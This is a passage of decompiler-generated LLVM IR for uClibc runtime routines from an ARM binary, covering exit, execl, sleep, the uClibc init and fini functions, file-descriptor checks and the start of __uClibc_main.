  uselistorder label %dec_label_pc_1737c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_1734c, { 1, 0 }
  uselistorder label %dec_label_pc_17334, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_172d8, { 1, 0 }
  uselistorder label %dec_label_pc_172d4, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17250, { 1, 0 }
  uselistorder label %dec_label_pc_1724c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_17390 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_17390, i32* @r0, align 4
  %v1_173ac = call i32 @__pthread_return_void()
  %v1_173bc = call i32 @__pthread_return_0()
  %v2_173c4 = load i32, i32* @global_var_2ee78.1061, align 4
  %v2_173c8 = icmp eq i32 %v2_173c4, 0
  br i1 %v2_173c8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_173c4)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_17390, i32* @r0, align 4
  %v1_173e8 = call i32 @__pthread_return_void()
  store i32 %v1_173e8, i32* @r0, align 4
  %v1_173ec = call i32 @__GI___uClibc_fini(i32 %v1_173e8)
  store i32 95232, i32* @lr, align 4
  %v2_173fc = call i32 @_stdio_term()
  %v0_17400 = load i32, i32* @r4, align 4
  %v1_17404 = call i32 @__GI__exit(i32 %v0_17400)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 2, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_17424 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_17424, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_17434 = ptrtoint i32* %stack_var_-32 to i32
  %v2_17438 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_17438, i32* %stack_var_-32, align 4
  br label %dec_label_pc_17444

dec_label_pc_17444:                               ; preds = %dec_label_pc_17444, %entry
  %v0_17458 = phi i32 [ %v1_17458, %dec_label_pc_17444 ], [ 0, %entry ]
  %v3_17444 = phi i32 [ %v1_1744c, %dec_label_pc_17444 ], [ %v2_17438, %entry ]
  %v1_17448 = inttoptr i32 %v3_17444 to i32*
  %v2_17448 = load i32, i32* %v1_17448, align 4
  %v1_1744c = add i32 %v3_17444, 4
  %v2_17450 = icmp eq i32 %v2_17448, 0
  store i32 %v1_1744c, i32* %stack_var_-32, align 4
  %v1_17458 = add i32 %v0_17458, 1
  store i32 %v1_17458, i32* @lr, align 4
  br i1 %v2_17450, label %dec_label_pc_17460, label %dec_label_pc_17444

dec_label_pc_17460:                               ; preds = %dec_label_pc_17444
  %v3_17460.neg = mul i32 %v1_17458, -4
  %v1_17464.neg = add i32 %v2_17434, -8
  %v2_17468 = add i32 %v1_17464.neg, %v3_17460.neg
  %v2_17470 = inttoptr i32 %v2_17468 to i32*
  store i32 %arg2, i32* %v2_17470, align 4
  store i32 %v2_17438, i32* %stack_var_-32, align 4
  %v0_1747c = load i32, i32* @sp, align 4
  store i32 %v0_1747c, i32* @r1, align 4
  store i32 %v0_1747c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_17484.dec_label_pc_17484_crit_edge, %dec_label_pc_17460
  %v1_17498 = phi i32 [ %v5_17498, %dec_label_pc_17484.dec_label_pc_17484_crit_edge ], [ %v0_1747c, %dec_label_pc_17460 ]
  %v3_17484 = phi i32 [ %v3_17484.pre, %dec_label_pc_17484.dec_label_pc_17484_crit_edge ], [ %v2_17438, %dec_label_pc_17460 ]
  %v1_17488 = inttoptr i32 %v3_17484 to i32*
  %v2_17488 = load i32, i32* %v1_17488, align 4
  %v0_1748c = load i32, i32* @lr, align 4
  %v1_1748c = add i32 %v0_1748c, -1
  store i32 %v1_1748c, i32* @lr, align 4
  %v7_1748c = icmp eq i32 %v0_1748c, 1
  %v1_17490 = add i32 %v3_17484, 4
  store i32 %v1_17490, i32* %stack_var_-32, align 4
  %v2_17498 = add i32 %v1_17498, 4
  %v3_17498 = inttoptr i32 %v2_17498 to i32*
  store i32 %v2_17488, i32* %v3_17498, align 4
  %v4_17498 = load i32, i32* %ip.global-to-local, align 4
  %v5_17498 = add i32 %v4_17498, 4
  store i32 %v5_17498, i32* %ip.global-to-local, align 4
  br i1 %v7_1748c, label %dec_label_pc_174a0, label %dec_label_pc_17484.dec_label_pc_17484_crit_edge

dec_label_pc_17484.dec_label_pc_17484_crit_edge:  ; preds = %dec_label_pc_17484
  %v3_17484.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_17484

dec_label_pc_174a0:                               ; preds = %dec_label_pc_17484
  %v2_174a4 = load i32, i32* @global_var_2ee80.1066, align 4
  store i32 %v2_174a4, i32* @r2, align 4
  %v0_174a8 = call i32 @__GI_execve()
  ret i32 %v0_174a8

; uselistorder directives
  uselistorder i32 %v5_17498, { 1, 0 }
  uselistorder i32 %v0_1748c, { 1, 0 }
  uselistorder i32 %v1_17458, { 0, 2, 1 }
  uselistorder i32 %v1_1744c, { 1, 0 }
  uselistorder i32 %v3_17444, { 1, 0 }
  uselistorder i32 %v2_17438, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_174b8 = load i32, i32* @r4, align 4
  store i32 %v3_174b8, i32* %stack_var_-20, align 4
  %v6_174b8 = load i32, i32* @r5, align 4
  %v9_174b8 = load i32, i32* @r6, align 4
  %v16_174b8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_174bc = icmp eq i32 %arg1, 0
  %v2_174c0 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_174bc, label %dec_label_pc_17644, label %dec_label_pc_174d8.preheader

dec_label_pc_174d8.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_174e017 = add i32 %v16_174b8, 124
  br label %dec_label_pc_174d0

dec_label_pc_174d0:                               ; preds = %dec_label_pc_174d8.preheader, %dec_label_pc_174d0
  %v5_174e018 = phi i32 [ %v5_174e017, %dec_label_pc_174d8.preheader ], [ %v5_174e0, %dec_label_pc_174d0 ]
  %v2_174d4 = add i32 %v5_174e018, -136
  %v3_174d4 = inttoptr i32 %v2_174d4 to i32*
  store i32 0, i32* %v3_174d4, align 4
  %v0_174d8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_174d8 = add i32 %v0_174d8.pre, -1
  store i32 %v1_174d8, i32* %r1.global-to-local, align 4
  %v6_174d8 = icmp slt i32 %v1_174d8, 0
  %v4_174e0 = mul i32 %v1_174d8, 4
  %v5_174e0 = add i32 %v4_174e0, %v16_174b8
  br i1 %v6_174d8, label %dec_label_pc_174e8, label %dec_label_pc_174d0

dec_label_pc_174e8:                               ; preds = %dec_label_pc_174d0
  %v2_174e8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_174e8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_174f8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_174f8, i32* %stack_var_-28, align 4
  %v0_17500 = call i32 @__sigaddset()
  store i32 %v0_17500, i32* %r0.global-to-local, align 4
  %v1_17504 = load i32, i32* @r5, align 4
  %v5_17508 = icmp slt i32 %v0_17500, %v1_17504
  br i1 %v5_17508, label %dec_label_pc_1764c, label %dec_label_pc_1750c

dec_label_pc_1750c:                               ; preds = %dec_label_pc_174e8
  %v2_1750c = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_1750c, i32* @r4, align 4
  store i32 %v1_17504, i32* %r0.global-to-local, align 4
  store i32 %v2_174e8, i32* %r1.global-to-local, align 4
  %v3_1751c = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_1751c = call i32 @__GI_sigprocmask(i32 %v1_17504, %_TYPEDEF_sigset_t* %v3_1751c, i32 %v2_1750c)
  store i32 %v4_1751c, i32* %r0.global-to-local, align 4
  %v1_17520 = load i32, i32* @r5, align 4
  %v9_17520 = icmp eq i32 %v4_1751c, %v1_17520
  br i1 %v9_17520, label %dec_label_pc_17528, label %dec_label_pc_1764c

dec_label_pc_17528:                               ; preds = %dec_label_pc_1750c
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_1750c, i32* %r0.global-to-local, align 4
  %v2_17530 = call i32 @__sigismember(i32 %v2_1750c, i32 17)
  store i32 %v2_17530, i32* %r0.global-to-local, align 4
  %v1_17534 = load i32, i32* @r5, align 4
  %v9_17534 = icmp eq i32 %v2_17530, %v1_17534
  br i1 %v9_17534, label %dec_label_pc_1754c.preheader, label %dec_label_pc_17528.dec_label_pc_17614_crit_edge

dec_label_pc_17528.dec_label_pc_17614_crit_edge:  ; preds = %dec_label_pc_17528
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_17614

dec_label_pc_1754c.preheader:                     ; preds = %dec_label_pc_17528
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17544

dec_label_pc_17544:                               ; preds = %dec_label_pc_1754c.preheader, %dec_label_pc_17544
  %v5_1755416 = phi i32 [ %v5_174e017, %dec_label_pc_1754c.preheader ], [ %v5_17554, %dec_label_pc_17544 ]
  %v2_17548 = add i32 %v5_1755416, -136
  %v3_17548 = inttoptr i32 %v2_17548 to i32*
  store i32 0, i32* %v3_17548, align 4
  %v0_1754c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1754c = add i32 %v0_1754c.pre, -1
  store i32 %v1_1754c, i32* %r1.global-to-local, align 4
  %v6_1754c = icmp slt i32 %v1_1754c, 0
  %v4_17554 = mul i32 %v1_1754c, 4
  %v5_17554 = add i32 %v4_17554, %v16_174b8
  br i1 %v6_1754c, label %dec_label_pc_1755c, label %dec_label_pc_17544

dec_label_pc_1755c:                               ; preds = %dec_label_pc_17544
  store i32 %v2_174e8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_17564 = call i32 @__sigaddset()
  store i32 %v0_17564, i32* %r0.global-to-local, align 4
  %v1_17568 = icmp slt i32 %v0_17564, 0
  br i1 %v1_17568, label %dec_label_pc_1764c, label %dec_label_pc_17570

dec_label_pc_17570:                               ; preds = %dec_label_pc_1755c
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_1757c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_174c0)
  store i32 %v4_1757c, i32* %r0.global-to-local, align 4
  %v1_17580 = icmp slt i32 %v4_1757c, 0
  br i1 %v1_17580, label %dec_label_pc_17588, label %dec_label_pc_175b0

dec_label_pc_17588:                               ; preds = %dec_label_pc_17570
  %v0_17588 = call i32 @__errno_location()
  store i32 %v2_1750c, i32* %r1.global-to-local, align 4
  store i32 %v0_17588, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1759c = inttoptr i32 %v0_17588 to i32*
  %v2_1759c = load i32, i32* %v1_1759c, align 4
  store i32 %v2_1759c, i32* @r4, align 4
  %v3_175a0 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_175a0 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_175a0, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_175a8 = load i32, i32* @r4, align 4
  %v1_175a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_175a8 = inttoptr i32 %v1_175a8 to i32*
  store i32 %v0_175a8, i32* %v2_175a8, align 4
  %v17_17654.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17650

dec_label_pc_175b0:                               ; preds = %dec_label_pc_17570
  %v2_175b0 = load i32, i32* %stack_var_-424, align 4
  %v7_175b4 = icmp eq i32 %v2_175b0, 1
  %v2_175bc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_175bc, i32* @r4, align 4
  br i1 %v7_175b4, label %dec_label_pc_175c4, label %dec_label_pc_175f8

dec_label_pc_175c4:                               ; preds = %dec_label_pc_175b0
  store i32 %v2_175bc, i32* %r1.global-to-local, align 4
  store i32 %v2_175bc, i32* %r0.global-to-local, align 4
  %v2_175cc = bitcast i32* %stack_var_-28 to %timespec*
  %v3_175cc = call i32 @__libc_nanosleep(%timespec* %v2_175cc, i32 %v2_175bc)
  store i32 %v3_175cc, i32* %r0.global-to-local, align 4
  store i32 %v3_175cc, i32* %r6.global-to-local, align 4
  %v0_175d4 = call i32 @__errno_location()
  store i32 %v2_1750c, i32* %r1.global-to-local, align 4
  store i32 %v0_175d4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_175e8 = inttoptr i32 %v0_175d4 to i32*
  %v2_175e8 = load i32, i32* %v1_175e8, align 4
  store i32 %v2_175e8, i32* @r4, align 4
  %v3_175ec = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_175ec = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_175ec, i32 0)
  store i32 %v4_175ec, i32* %r0.global-to-local, align 4
  %v0_175f0 = load i32, i32* @r4, align 4
  %v1_175f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_175f0 = inttoptr i32 %v1_175f0 to i32*
  store i32 %v0_175f0, i32* %v2_175f0, align 4
  %v0_17620.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17620

dec_label_pc_175f8:                               ; preds = %dec_label_pc_175b0
  store i32 %v2_1750c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_17604 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_17604 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_17604, i32 0)
  store i32 %v4_17604, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17614

dec_label_pc_17614:                               ; preds = %dec_label_pc_17528.dec_label_pc_17614_crit_edge, %dec_label_pc_175f8
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_17528.dec_label_pc_17614_crit_edge ], [ %v2_175bc, %dec_label_pc_175f8 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_17618 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_17618 = call i32 @__libc_nanosleep(%timespec* %v2_17618, i32 %storemerge.pre-phi)
  store i32 %v3_17618, i32* %r0.global-to-local, align 4
  store i32 %v3_17618, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17620

dec_label_pc_17620:                               ; preds = %dec_label_pc_175c4, %dec_label_pc_17614
  %v0_17620 = phi i32 [ %v0_17620.pr, %dec_label_pc_175c4 ], [ %v3_17618, %dec_label_pc_17614 ]
  %v2_17620 = icmp eq i32 %v0_17620, 0
  br i1 %v2_17620, label %dec_label_pc_17644, label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %dec_label_pc_17620
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17630 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_17630, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17650

dec_label_pc_17644:                               ; preds = %entry, %dec_label_pc_17620
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17650

dec_label_pc_1764c:                               ; preds = %dec_label_pc_1750c, %dec_label_pc_1755c, %dec_label_pc_174e8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17650

dec_label_pc_17650:                               ; preds = %dec_label_pc_17628, %dec_label_pc_17644, %dec_label_pc_17588, %dec_label_pc_1764c
  %v17_17654 = phi i32 [ %v3_17630, %dec_label_pc_17628 ], [ 0, %dec_label_pc_17644 ], [ %v17_17654.pre, %dec_label_pc_17588 ], [ -1, %dec_label_pc_1764c ]
  %v2_17654 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17654, i32* @r4, align 4
  store i32 %v6_174b8, i32* @r5, align 4
  store i32 %v9_174b8, i32* @r6, align 4
  ret i32 %v17_17654

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_175bc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_1754c, { 0, 2, 1 }
  uselistorder i32 %v2_1750c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_17504, { 1, 0, 2 }
  uselistorder i32 %v1_174d8, { 0, 2, 1 }
  uselistorder i32 %v16_174b8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 8, 9, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_17650, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1764c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17644, { 1, 0 }
  uselistorder label %dec_label_pc_17620, { 1, 0 }
  uselistorder label %dec_label_pc_17614, { 1, 0 }
  uselistorder label %dec_label_pc_17544, { 1, 0 }
  uselistorder label %dec_label_pc_174d0, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_17688:
  %stack_var_-8 = alloca i32, align 4
  %v3_1765c = load i32, i32* @r4, align 4
  store i32 %v3_1765c, i32* %stack_var_-8, align 4
  %v2_1768c = load i32, i32* @global_var_2ee88.1072, align 4
  %v2_17690 = icmp eq i32 %v2_1768c, 0
  br i1 %v2_17690, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_17688
  call void @__pseudo_branch(i32 %v2_1768c)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17688, %bb
  %v2_176a0 = load i32, i32* @global_var_2ee8c.1074, align 4
  %v2_176a4 = icmp eq i32 %v2_176a0, 0
  br i1 %v2_176a4, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_176a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_176a8, i32* @r4, align 4
  %v9_176a8 = load i32, i32* @r0, align 4
  ret i32 %v9_176a8

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_176a0)
  %v2_176b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_176b4, i32* @r4, align 4
  %v8_176b4 = load i32, i32* @r0, align 4
  ret i32 %v8_176b4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_176d0 = load i32, i32* @r0, align 4
  ret i32 %v1_176d0
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_176d4 = load i32, i32* @r4, align 4
  store i32 %v3_176d4, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_176e4 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_176e8 = icmp eq i32 %v2_176e4, -1
  br i1 %v7_176e8, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_176ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_176ec, i32* @r4, align 4
  ret i32 %v2_176e4

bb5:                                              ; preds = %entry
  %v0_176f0 = load i32, i32* @r4, align 4
  %v4_176f8 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20310.1077, i32 0, i32 0), i32 %v0_176f0)
  %v1_176fc = load i32, i32* %r5.global-to-local, align 4
  %v9_176fc = icmp eq i32 %v4_176f8, %v1_176fc
  br i1 %v9_176fc, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  %v3_17700 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17700, i32* @r4, align 4
  ret i32 %v4_176f8

bb7:                                              ; preds = %bb5
  %v0_17704 = call i32 @abort()
  %v0_17708 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17708, label %bb8, label %bb9

bb8:                                              ; preds = %bb7
  %v1_17708 = load i32, i32* @r2, align 4
  %v3_17708 = load i32, i32* @r3, align 4
  %v8_17708 = shl i32 %v0_17704, %v3_17708
  %v9_17708 = and i32 %v8_17708, %v1_17708
  br label %bb9

bb9:                                              ; preds = %bb7, %bb8
  %v10_17708 = phi i32 [ %v0_17704, %bb7 ], [ %v9_17708, %bb8 ]
  ret i32 %v10_17708

; uselistorder directives
  uselistorder i32 %v2_176e4, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_17710 = load i32, i32* @global_var_2ee90.1079, align 4
  %v2_17714 = icmp eq i32 %v2_17710, 0
  br i1 %v2_17714, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_17720 = load i32, i32* @r0, align 4
  ret i32 %v6_17720

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_2ee90.1079, align 4
  store i32 4096, i32* @global_var_2ee84.992, align 4
  %v0_17754 = call i32 @_stdio_init()
  ret i32 %v0_17754
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_1776c = mul i32 %arg2, 4
  %v5_1776c = add i32 %tmp, %v4_1776c
  %v2_17770 = load i32, i32* %arg3, align 4
  %v2_17774 = ptrtoint i32* %stack_var_-120 to i32
  %v1_17778 = add i32 %v5_1776c, 4
  %v9_1777c = icmp eq i32 %v1_17778, %v2_17770
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_2ee7c.1084, align 4
  store i32 %v1_17778, i32* @global_var_2ee80.1066, align 4
  store i32 %arg6, i32* @global_var_2ee8c.1074, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_1777c, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_1776c, i32* @global_var_2ee80.1066, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_177bc = bitcast i32* %stack_var_-120 to i8*
  %v3_177bc = call i32 @__GI_memset(i8* %v2_177bc, i32 0)
  %storemerge.pre = load i32, i32* @global_var_2ee80.1066, align 4
  br label %dec_label_pc_177cc

dec_label_pc_177cc:                               ; preds = %dec_label_pc_177cc, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_177cc, %dec_label_pc_177cc ]
  %v1_177cc = inttoptr i32 %storemerge to i32*
  %v2_177cc = load i32, i32* %v1_177cc, align 4
  %v4_177cc = add i32 %storemerge, 4
  %v2_177d0 = icmp eq i32 %v2_177cc, 0
  br i1 %v2_177d0, label %dec_label_pc_177dc, label %dec_label_pc_177cc

dec_label_pc_177dc:                               ; preds = %dec_label_pc_177cc
  store i32 %v4_177cc, i32* @r4, align 4
  %v1_177fc22 = inttoptr i32 %v4_177cc to i32*
  %v2_177fc23 = load i32, i32* %v1_177fc22, align 4
  %v2_1780025 = icmp eq i32 %v2_177fc23, 0
  br i1 %v2_1780025, label %dec_label_pc_17808, label %dec_label_pc_177e4

dec_label_pc_177e4:                               ; preds = %dec_label_pc_177dc, %dec_label_pc_177fc
  %v5_177e8 = phi i32 [ %v2_177fc, %dec_label_pc_177fc ], [ %v2_177fc23, %dec_label_pc_177dc ]
  %v2_177e4 = icmp ugt i32 %v5_177e8, 13
  %v7_177e4 = icmp eq i32 %v5_177e8, 14
  %v2_177e8 = xor i1 %v2_177e4, true
  %v3_177e8 = or i1 %v7_177e4, %v2_177e8
  br i1 %v3_177e8, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_177e4
  %v6_177e8 = and i32 %v5_177e8, 536870912
  %v7_177e8 = icmp ne i32 %v6_177e8, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_177e4, %bb42
  %v1_177f4 = phi i1 [ %v2_177e4, %dec_label_pc_177e4 ], [ %v7_177e8, %bb42 ]
  %v2_177ec = xor i1 %v1_177f4, true
  %v3_177ec = or i1 %v7_177e4, %v2_177ec
  br i1 %v3_177ec, label %bb44, label %dec_label_pc_177fc

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_177fc

dec_label_pc_177fc:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_177ec, i32 ptrtoint (i32* @global_var_15700.1087 to i32))
  %v0_177f8 = load i32, i32* @r4, align 4
  %v1_177f8 = add i32 %v0_177f8, 8
  store i32 %v1_177f8, i32* @r4, align 4
  %v1_177fc = inttoptr i32 %v1_177f8 to i32*
  %v2_177fc = load i32, i32* %v1_177fc, align 4
  %v2_17800 = icmp eq i32 %v2_177fc, 0
  br i1 %v2_17800, label %dec_label_pc_17808, label %dec_label_pc_177e4

dec_label_pc_17808:                               ; preds = %dec_label_pc_177fc, %dec_label_pc_177dc
  %v1_1780c = call i32 @_dl_aux_init(i32 %v2_17774)
  store i32 %v1_1780c, i32* @r0, align 4
  %v1_17810 = call i32 @__GI___uClibc_init(i32 %v1_1780c)
  store i32 %v1_17810, i32* @r0, align 4
  %v2_1781c = icmp eq i32 %tmp37, 0
  br i1 %v2_1781c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_17808
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_17808, %bb45
  %v0_1782c = phi i32 [ %tmp37, %dec_label_pc_17808 ], [ 4096, %bb45 ]
  %v3_17824 = icmp eq i32 %tmp36, -1
  %v8_17824 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_2ee84.992 to i32), i32* @r2, align 4
  store i32 %v0_1782c, i32* @global_var_2ee84.992, align 4
  br i1 %v3_17824, label %dec_label_pc_17834, label %dec_label_pc_1785c

dec_label_pc_17834:                               ; preds = %bb46
  %v0_17834 = call i32 @getuid()
  store i32 %v0_17834, i32* @r0, align 4
  store i32 %v0_17834, i32* @r4, align 4
  %v0_1783c = call i32 @geteuid()
  %v0_17840 = load i32, i32* @r4, align 4
  %v9_17840 = icmp eq i32 %v0_17840, %v0_1783c
  br i1 %v9_17840, label %dec_label_pc_17848, label %dec_label_pc_17884

dec_label_pc_17848:                               ; preds = %dec_label_pc_17834
  %v1_17848 = call i32 @getgid(i32 %v0_1783c)
  store i32 %v1_17848, i32* @r0, align 4
  store i32 %v1_17848, i32* @r4, align 4
  %v0_17850 = call i32 @getegid()
  %v0_17854 = load i32, i32* @r4, align 4
  %v9_17854 = icmp eq i32 %v0_17854, %v0_17850
  br i1 %v9_17854, label %dec_label_pc_1785c, label %dec_label_pc_17884

dec_label_pc_1785c:                               ; preds = %dec_label_pc_17848, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_17824, label %dec_label_pc_178f0, label %dec_label_pc_17868

dec_label_pc_17868:                               ; preds = %dec_label_pc_1785c
  %v9_1786c = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_1786c, label %dec_label_pc_17874, label %dec_label_pc_17884

dec_label_pc_17874:                               ; preds = %dec_label_pc_17868
  br label %dec_label_pc_17884

